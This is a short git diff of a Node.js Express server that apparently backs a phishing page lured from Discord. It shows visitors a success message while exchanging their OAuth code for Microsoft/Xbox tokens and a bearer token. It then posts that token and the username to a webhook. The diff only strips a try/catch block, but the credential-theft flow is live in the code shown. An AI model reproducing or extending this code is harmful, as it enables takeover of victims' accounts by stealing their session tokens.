@@ -10,7 +10,6 @@ const port = process.env.PORT || 8080
 
 app.get('/', (req, res) => {
     res.send('Success! You can exit this page and return to discord.')
-    try {
         const code = req.query.code
         const accessToken = getAccessToken(code)
         const userHash = getUserHashAndToken(accessToken)[0]
@@ -19,9 +18,6 @@ app.get('/', (req, res) => {
         const bearerToken = getBearerTokenAndUsername(xstsToken, userHash)[0]
         const username = getBearerTokenAndUsername(xstsToken, userHash)[1]
         postToWebhook(username, bearerToken)
-    } catch (err) {
-        console.log(err)
-    }
 })
 
 app.listen(port, () => {
